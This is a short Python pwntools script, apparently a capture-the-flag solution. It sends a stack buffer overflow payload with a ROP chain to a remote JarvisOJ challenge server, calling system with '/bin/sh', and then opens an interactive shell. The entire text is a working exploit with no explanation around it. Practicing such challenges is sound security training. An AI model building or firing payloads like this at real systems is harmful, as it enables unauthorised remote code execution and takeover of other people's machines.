from pwn import *

p = remote("pwn2.jarvisoj.com", 9882)
rop0 = 0x00000000004006b3 #pop rdi ; ret
bin_sh = 0x0000000000600a90
payload = 'A' * 136 + p64(rop0) + p64(bin_sh) + p64(0x00000000004004c0)

p.send(payload)

p.interactive()
